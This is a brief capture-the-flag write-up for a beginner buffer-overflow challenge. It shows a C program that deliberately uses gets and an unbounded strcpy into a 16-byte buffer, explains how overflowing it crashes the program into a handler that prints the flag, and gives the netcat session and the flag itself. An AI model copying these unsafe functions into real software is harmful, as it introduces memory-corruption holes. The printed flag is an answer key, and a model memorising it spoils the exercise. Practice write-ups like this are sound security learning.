# BUFFER OVERFLOW 0
In this challenge were given with the following c program:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
After some research i found out that the sigsegv_handler function is a custom handler for segmentation faults. The problem that we can see here is the use of strcpy which does not check for bounds.
So its easy for an attacker to overflow buf2 if the input exceeds 16 bytes. This is easy to do as the input is taken in buf1 where gets is used which is another function that is vunerable (allows input upto 100 bytes so we can exceed 16 byted easily)

So basically an attacker can trigger a segmentation fault and leak the flag by exceeding the input size beyond the size of buf2.

So that what i did:
```
aditya_cryptonite@DESKTOP-SG1LV2M:~$ nc saturn.picoctf.net 61825
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
### Flag:
>picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
